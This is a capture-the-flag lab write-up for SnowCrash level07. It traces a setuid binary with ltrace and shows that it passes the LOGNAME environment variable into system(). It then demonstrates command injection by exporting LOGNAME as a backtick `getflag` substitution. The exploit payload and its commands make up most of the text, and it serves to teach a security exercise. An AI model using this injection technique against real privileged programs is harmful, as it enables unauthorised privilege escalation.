# Find the Flag07 Password

When we log in as `level07`, we can see the `level07` executable in the home directory.

Run it first:

```sh
level07@SnowCrash:~$ ./level07
level07
```

The program prints `level07`. To understand where that value comes from, inspect the executable with `ltrace`:

```sh
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>)
getegid()                                                             = 2007
geteuid()                                                             = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                   = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                   = 0
getenv("LOGNAME")                                                     = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff49, 0xb7e5ee55, 0xb7fed280)   = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                = 0
+++ exited (status 0) +++
```

The important lines are:

```text
getenv("LOGNAME") = "level07"
system("/bin/echo level07 ")
```

The program reads the `LOGNAME` environment variable with `getenv()`, then builds a command and passes it to `system()`.

Because `system()` executes the command through a shell, shell syntax inside `LOGNAME` can be interpreted. This allows command injection through the environment variable.

## Exploit the Environment Variable

Set `LOGNAME` to a command substitution payload:

```sh
level07@SnowCrash:~$ export LOGNAME="\`getflag\`"
```

The backslashes are used to keep the backticks literal inside the current shell. Their purpose is not simply to block `getflag` from running, but to delay its execution from the current shell to the shell later launched by `level07` through `system()`.

Now run the executable again:

```sh
level07@SnowCrash:~$ ./level07
```

The shell evaluates `` `getflag` `` inside the command passed to `system()`, so the program prints the token for the next level.
